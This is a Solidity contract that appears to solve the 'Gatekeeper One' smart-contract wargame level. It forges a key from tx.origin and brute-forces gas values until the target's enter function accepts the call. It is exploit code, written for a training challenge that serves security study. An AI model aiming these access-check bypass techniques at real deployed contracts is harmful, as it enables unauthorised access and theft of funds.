// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0;i < 8191; i++) {
            (bool result,) = target.call{gas: i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}
